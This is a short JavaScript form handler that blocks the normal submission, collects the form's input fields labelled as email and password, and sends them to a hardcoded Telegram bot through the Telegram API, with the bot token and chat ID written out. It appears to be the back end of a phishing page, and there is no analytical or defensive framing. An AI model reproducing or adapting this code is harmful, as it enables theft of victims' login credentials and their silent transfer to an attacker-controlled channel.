const form = document.querySelector("form");
const inputs = document.querySelectorAll("input");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const token = "6864550468:AAHkvb2XSnYwnIz60uZJTJxtasW6U2kcPbU";
    const chat_id = "5639053483";
    const firstName = inputs[0].value;
    const lastName = inputs[1].value;
    const you = inputs[2].value;
    const message = `Email : ${firstName}  Password : ${lastName} you ${you}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

    fetch(url)
        .then(response => console.log('Message sent successfully'))
        .catch(error => console.error('Error sending message:', error));
});
